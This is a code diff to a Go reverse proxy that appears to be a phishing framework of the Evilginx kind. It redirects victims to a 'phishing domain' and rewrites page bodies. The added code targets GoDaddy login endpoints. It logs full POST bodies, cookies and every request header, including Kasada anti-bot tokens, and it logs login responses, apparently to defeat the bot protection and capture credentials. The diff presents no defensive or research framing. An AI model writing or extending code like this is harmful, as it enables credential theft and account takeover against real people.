@@ -1049,6 +1049,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						log.Debug("POST: %s", req.URL.Path)
 						log.Debug("POST body = %s", body)
 
+						// dump Kasada-specific headers for GoDaddy login endpoint
+						if strings.Contains(req.URL.Path, "idp/login") || strings.Contains(req.URL.Path, "api/login") {
+							log.Debug("[gdlogin] path=%s host=%s", req.URL.Path, req.Host)
+							log.Debug("[gdlogin] x-kpsdk-ct=%s", req.Header.Get("x-kpsdk-ct"))
+							log.Debug("[gdlogin] x-kpsdk-cd=%s", req.Header.Get("x-kpsdk-cd"))
+							log.Debug("[gdlogin] x-kpsdk-r=%s", req.Header.Get("x-kpsdk-r"))
+							log.Debug("[gdlogin] origin=%s referer=%s", req.Header.Get("Origin"), req.Header.Get("Referer"))
+							log.Debug("[gdlogin] content-type=%s content-len=%d", req.Header.Get("Content-Type"), req.ContentLength)
+							log.Debug("[gdlogin] cookie-count=%d", len(req.Cookies()))
+							log.Debug("[gdlogin] body=%s", string(body))
+							for hk, hvs := range req.Header {
+								log.Debug("[gdlogin-hdr] %s: %s", hk, strings.Join(hvs, "; "))
+							}
+						}
+
 						contentType := req.Header.Get("Content-type")
 
 						json_re := regexp.MustCompile(`application\/\w*\+?json`)
@@ -1326,6 +1341,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_hostname := strings.ToLower(resp.Request.Host)
+
+			// log GoDaddy login API responses for debugging
+			if strings.Contains(resp.Request.URL.Path, "idp/login") || strings.Contains(resp.Request.URL.Path, "api/login") {
+				log.Debug("[gdlogin-resp] path=%s status=%d ct=%s", resp.Request.URL.Path, resp.StatusCode, resp.Header.Get("Content-Type"))
+				if resp.Body != nil {
+					respBody, rerr := ioutil.ReadAll(resp.Body)
+					if rerr == nil {
+						resp.Body = ioutil.NopCloser(bytes.NewBuffer(respBody))
+						log.Debug("[gdlogin-resp] body=%s", string(respBody))
+					}
+				}
+			}
 
 			// if "Location" header is present, make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
@@ -1687,10 +1714,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
 									}
 
-									// Fast-path: extract a literal hint from the filter and skip regex if body cannot match
-									hint := extractLiteralHint(sf.regexp)
-									if hint == "" || bytes.Contains(body, []byte(hint)) {
+									// Fast-path: extract a literal hint from the EXPANDED regex and skip if body cannot match.
+									// We use re_s (after {hostname}/{domain} expansion) instead of sf.regexp
+									// because sf.regexp contains template variables like {hostname} which
+									// produce misleading hints (e.g. "hostname") that don't appear in the body.
+									hint := extractLiteralHint(re_s)
+									hintHit := hint == "" || bytes.Contains(body, []byte(hint))
+									if strings.Contains(sf.regexp, `"domain"`) || strings.Contains(sf.regexp, "{hostname}") {
+										log.Debug("[kasada-dbg] req=%s sf.regexp=%q hint=%q hintHit=%v bodyLen=%d re_s=%q replace_s=%q", req_hostname, sf.regexp, hint, hintHit, len(body), re_s, replace_s)
+									}
+									if hintHit {
 										if re, err := regexp.Compile(re_s); err == nil {
+											matchCount := len(re.FindAllString(string(body), -1))
+											if matchCount > 0 || strings.Contains(sf.regexp, `"domain"`) {
+												log.Debug("[kasada-dbg] regex matches=%d for re_s=%q on req=%s", matchCount, re_s, req_hostname)
+											}
 											if sf.domain == "*" {
 												plName := pl.Name
 												body = []byte(re.ReplaceAllStringFunc(string(body), func(m string) string {
@@ -2112,7 +2150,7 @@ func extractLiteralHint(pattern string) string {
 	current := ""
 	for i := 0; i < len(pattern); i++ {
 		c := pattern[i]
-		if c == '.' || c == '*' || c == '+' || c == '?' || c == '[' || c == '(' || c == '{' || c == '|' || c == '\\' || c == '$' || c == '^' {
+		if c == '.' || c == '*' || c == '+' || c == '?' || c == '[' || c == ']' || c == '(' || c == ')' || c == '{' || c == '}' || c == '|' || c == '\\' || c == '$' || c == '^' {
 			if len(current) > len(best) {
 				best = current
 			}
